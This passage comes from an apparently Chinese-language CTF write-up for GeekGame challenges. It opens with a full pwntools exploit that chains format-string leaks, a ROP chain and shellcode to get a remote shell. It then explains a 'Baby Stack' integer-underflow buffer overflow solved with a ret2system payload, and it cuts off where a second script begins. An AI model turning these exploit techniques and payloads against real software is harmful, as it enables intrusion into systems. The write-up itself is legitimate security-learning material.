<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10009</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">shellCode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">shellCode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellCode</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%lx</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your instruction:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">receivedLine</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">publicStringAddress</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">receivedLine</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">publicStringAddressRefer</span> <span class="o">=</span> <span class="mh">0x7fffffffdd60</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">publicStringAddress</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">publicStringAddressRefer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">stackReferToReal</span><span class="p">(</span><span class="n">referAddress</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="mh">0x7ffffffde000</span> <span class="o">&lt;=</span> <span class="n">referAddress</span> <span class="o">&lt;=</span> <span class="mh">0x7ffffffff000</span>
</span></span><span class="line"><span class="cl">    <span class="n">real</span> <span class="o">=</span> <span class="n">publicStringAddress</span> <span class="o">-</span> <span class="n">publicStringAddressRefer</span> <span class="o">+</span> <span class="n">referAddress</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">real</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">returnAddress</span> <span class="o">=</span> <span class="n">stackReferToReal</span><span class="p">(</span><span class="mh">0x7fffffffe1f8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stringStartAddress</span> <span class="o">=</span> <span class="n">stackReferToReal</span><span class="p">(</span><span class="mh">0x7fffffffdde0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%165$lx&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your instruction:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">receivedLine</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">main108Address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">receivedLine</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main108AddressRefer</span> <span class="o">=</span> <span class="mh">0x7ffff7f393fd</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">main108Address</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main108AddressRefer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">codeReferToReal</span><span class="p">(</span><span class="n">referAddress</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="mh">0x7ffff7f38000</span> <span class="o">&lt;=</span> <span class="n">referAddress</span> <span class="o">&lt;=</span> <span class="mh">0x7ffff7fce000</span>
</span></span><span class="line"><span class="cl">    <span class="n">real</span> <span class="o">=</span> <span class="n">main108Address</span> <span class="o">-</span> <span class="n">main108AddressRefer</span> <span class="o">+</span> <span class="n">referAddress</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">real</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">receivedLine</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">stringStartAddress</span> <span class="o">==</span> <span class="n">publicStringAddress</span> <span class="o">+</span> <span class="mh">0x80</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">returnAddress</span> <span class="o">==</span> <span class="n">publicStringAddress</span> <span class="o">+</span> <span class="mh">0x498</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stringStartAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">returnAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcodeOffset</span> <span class="o">=</span> <span class="mi">392</span>
</span></span><span class="line"><span class="cl"><span class="n">endAddressOffset</span> <span class="o">=</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl"><span class="n">shellCodeAddress</span> <span class="o">=</span> <span class="n">stringStartAddress</span> <span class="o">+</span> <span class="n">shellcodeOffset</span>
</span></span><span class="line"><span class="cl"><span class="n">stackEndPointer</span> <span class="o">=</span> <span class="n">stringStartAddress</span> <span class="o">+</span> <span class="n">shellcodeOffset</span> <span class="o">+</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellCodeAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stackEndPointer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">popRdiRet</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f38cd2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f38cd3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">popRdxRet</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f38bdf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">popRdiRbpRet</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f3ab1b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">popRsiRet</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f4681e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libcStackEndAddress</span> <span class="o">=</span> <span class="n">stackReferToReal</span><span class="p">(</span><span class="mh">0x7fffffffd318</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">makeStackExecutable</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7fbabb0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">putcharAddress</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f504a0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">testFunctionAddress</span> <span class="o">=</span> <span class="n">codeReferToReal</span><span class="p">(</span><span class="mh">0x7ffff7f39139</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addressTargetValue</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rdi -&gt; __libc_stack_end</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span><span class="p">:</span> <span class="n">popRdiRbpRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># returnAddress + 8:</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span> <span class="n">stackEndPointer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rdx = 7</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">16</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">24</span><span class="p">:</span> <span class="n">popRdxRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">32</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rsi = _dl_pagesize = 4096</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">40</span><span class="p">:</span> <span class="n">popRsiRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">48</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># call make_stack_executable+17</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">56</span><span class="p">:</span> <span class="n">makeStackExecutable</span> <span class="o">+</span> <span class="mi">17</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># returnAddress + 56: putcharAddress,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">64</span><span class="p">:</span> <span class="n">shellCodeAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">address</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">addressTargetValue</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">34</span><span class="p">,</span> <span class="n">addressTargetValue</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">shellcodeOffset</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellCode</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">endAddressOffset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">shellcodeOffset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">+=</span> <span class="n">shellCode</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">shellcodeOffset</span> <span class="o">+</span> <span class="n">endAddressOffset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">+=</span> <span class="n">libcStackEndAddress</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="ow">not</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">payload3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your instruction:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;ls -al&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload3</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">receiveLine</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">receiveLine</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<br>
<h3 id="15-baby-stack">15. Baby Stack</h3>
<h4 id="flag-1-3">Flag 1</h4>
<blockquote>
<p>这是我做出的第一道 Pwn 的题目</p>
</blockquote>
<p>用 <code>checksec</code> 发现只开启了 NX</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用 Ghidra 逆向文件，得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span><span class="o">*</span> <span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_line</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">max_len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">char_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">char_count</span> <span class="o">&lt;</span> <span class="n">max_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">char_count</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">buf</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">char_count</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span><span class="o">*</span> <span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">input_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to babystack :)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Input the size of your exploitation string (less than 100 chars with the ending </span><span class="se">\\</span><span class="s">n or EOF included):&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">input_size</span> <span class="o">&lt;</span> <span class="mi">101</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please input your string:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">get_line</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;:(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>输入的 <code>input_size</code> 为 <code>unsigned</code>，当 <code>input_size = 100</code> 时程序正常运行，但 <code>get_line</code> 的实现中有 <code>max_len - 1</code>。</p>
<p>当 <code>input_size = 0</code> 时程序发生下溢出，可以读入任意长的字符串。</p>
<blockquote>
<p>当时没有发现 <code>backdoor</code> 函数，所以搞得比较复杂。</p>
</blockquote>
<p>程序中存在 <code>system</code> 函数。并且存在 <code>/bin/sh</code> 字符串，但是没有 <code>pop rdi; ret</code> 的 gadget，当时不会 ret2libc，所以用了重新跳转到 <code>main</code> 函数中间，以使得 <code>rdi</code> 指向读入的字符串。</p>
<blockquote>
<p>跳转到 <code>main</code> 函数中间是因为不然会在执行一遍 <code>init</code> 函数，程序会崩溃。</p>
</blockquote>
<p><code>main+137</code> 将 <code>rdi</code> 指向读入的字符串：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   0x0000000000401311 &lt;+137&gt;:   lea    rdi,[rip+0xcf4]        # 0x40200c
</span></span></code></pre></td></tr></table>
</div>
</div><p>用 pwndbg 调试出读入字符串与返回地址的距离是 128。所以构造 payload 为 <code>'A' * 120 + main137 + 'B' * 16 + '/bin/sh\0' + 'C' * 112 + ret + system_plt</code>，第二次读取字符串时只需要输入很短的字符串即可。程序会先跳转到 <code>main137</code>，设置 <code>rdi</code> 指向 <code>/bin/sh</code>，再跳转执行 <code>ret</code> 和 <code>system</code>。</p>
<ul>
<li>加入 <code>ret</code> 的 gadget 是为了让 xmm 寄存器 16 字节对齐。当时做不出来了，乱查查到了 <a href="https://blog.csdn.net/weixin_42016744/article/details/122422452">pwn system(&quot;/bin/sh&quot;)失败的原因</a></li>
<li>另外还加了 <code>add rsp, 0x88; ret</code> 的 gadget，不然有时候会报错（<code>puts</code> 可以打印出来，但是 <code>system</code> 不能执行，可能是栈覆盖到了 <code>/bin/sh</code>）</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./challenge1&#39;)</span>
